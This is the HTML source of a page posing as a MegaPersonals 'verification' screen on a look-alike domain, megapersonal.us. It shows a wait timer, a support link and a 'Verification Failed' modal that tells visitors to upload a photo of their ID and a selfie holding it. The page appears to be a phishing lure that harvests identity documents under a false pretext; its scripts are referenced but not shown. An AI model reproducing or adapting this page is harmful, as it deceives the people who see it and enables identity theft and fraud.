<html><head>
	<meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <title>MegaPersonals: Classified hookups</title>
    <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE">
    <meta charset="utf-8">
    <meta name="ROBOTS" content="INDEX, FOLLOW">
    <meta name="google-site-verification" content="5lgcaPvrDxOjE8Qn9rMbYKiJVahMPVReOQvezzd1nRY">
    <meta name="description" content="MegaPersonals - Post your classified ad and MEET NOW">
    <link rel="icon" href="resources/img/devilgirl_favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="resources/verify/css/bootstrap.min.css">
    <link rel="stylesheet" href="resources/verify/css/custom4e1b.css">
    <link rel="stylesheet" href="resources/verify/css/modal.css">
    <link rel="stylesheet" href="resources/verify/css/custom4e1b.css?v=1606909526">
    <link rel="stylesheet" href="resources/verify/css/emojionearea.min4e1b.css?v=1606909526">
    <!-- The newest version could cause errors in Safari -->
    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TDBxTlSsKAUm3tSIa0fwIqNu/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-HTq9bAnQeRQMZWaz4oh4hzQ7uLhEPBDMd6NizGeUQEDJ09mI0WU9lRcdix2okyzP"></script><script type="text/javascript" async="" src="resources/verify/js/tag.js"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/eWmgPeIYKJsH2R2FrgakEIkq/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-3l+Dzjt73YLhXz+WejlQA/r4+koQU0wEJ+YZAtKZ8DTxOPwZ54aluvUaML5sjiPl"></script><script src="resources/verify/js/jquery.min.js" type="text/javascript"></script>
    <script src="resources/verify/js/jquery-ui.min.js"></script>
    <script src="resources/verify/js/jquery.cookie.min.js" type="text/javascript"></script>
    <script src="https://google.com/recaptcha/api.js"></script>
    <!-- Latest compiled and minified JavaScript -->
    <script src="resources/verify/js/bootstrap.min.js"></script>
    <script src="resources/verify/js/emojionearea.min4e1b.js?v=1606909526"></script>
    <script src="resources/verify/js/anti_clicker4e1b.js?v=1606909526" type="text/javascript"></script>
    <!-- Yandex.Metrika counter -->
    <noscript>
        <div><img src="https://mc.yandex.ru/watch/51410560" style="position:absolute; left:-9999px;" alt="" /></div>
    </noscript>
</head>
<body style="margin-top: -10px">
    <div class="frontpage">
        <div class="container candywrapper" style="padding-right: 4em; padding-left: 4em">
            <div class="row">
                <a href="http://megapersonal.us/home">
                    <img src="resources/img/megapersonalsPageHeader34e1b.png?v=1606909526" class="img-responsive center-block" alt="Megapersonals" id="megapersonalsPageHeader">
                </a>
            </div>
            <div class="row">
                <img src="resources/img/almostThereDarlings4e1b.png?v=1606909526" class="img-responsive center-block" alt="Megapersonals" id="megapersonalsPageHeader">
            </div>

            <span class="meetnow_byline">
                <h1 class="categoryLink" style="font-style: normal"><b>VERIFICATION process</b></h1>
                <div id="megap4AdSampleHeader">
                    <p style="font-style:normal">takes up to 7 Minutes.</p>
                    <p>Hold tight...</p>
                </div>
            </span>
            <h1 id="timer"></h1>
            <div id="try-again-verification" class="hidden text-center" style="color: red; font-weight: bold">
                <h3><i>Your verification process was not completed. Do you want to
                        <a id="try-again-link" onclick="location.reload();">try again</a></i> ?</h3>
            </div>
            <div class="hidden" id="contact-support">
                <a href="http://megapersonal.us/users/verification/support">
                    <img src="resources/img/contactSupport4e1b.png?v=1606909526" class="img-responsive center-block" alt="Megapersonals">
                </a>
        </div>
    </div>
    <script src="resources/verify/js/sockjs.min.js"></script>
    <script src="resources/verify/js/stomp.min.js"></script>
    <script src="resources/verify/js/ws_verification.js"></script>
    
    <div id="bluecheck-container">
		<span id="first-page" style="display:;">
		  <div id="bluecheck-container"><div class="bluecheck-screen-failedNSFW" style="display: block;">
        <div class="bluecheck-modal-wrapper">
            <div class="bluecheck-modal bluecheck-red">
                <div class="bluecheck-flex-info">
                    <h2 class="bluecheck-modal-body-h2" style="text-align:center;margin-top:50px;">
                        <span class="bluecheck-failure-header">Verification Failed</span>
                    </h2>
                    <div class="bluecheck-modal-body-red" style="text-align:center;padding-top:0px;">
                        <h4 class="bluecheck-alert-message">We were unable to process the images you submitted.</h4>
                        <h4 class="bluecheck-alert-message">Please make sure you submit a clear photo of your ID and a selfie holding your ID.</h4>
                        <a href="index.php" id="bluecheck-return-nsfw" class="bluecheck-link-close bluecheck-link-close-red">Retry</a>
                    </div>
                </div>
            </div>
        </div>
    </div></div>
	</span>

		
    </div></div><iframe name="ym-native-frame" title="ym-native-frame" frameborder="0" aria-hidden="true" style="opacity: 0 !important; width: 0px !important; height: 0px !important; position: absolute !important; left: 100% !important; bottom: 100% !important; border: 0px !important;"></iframe></body></html>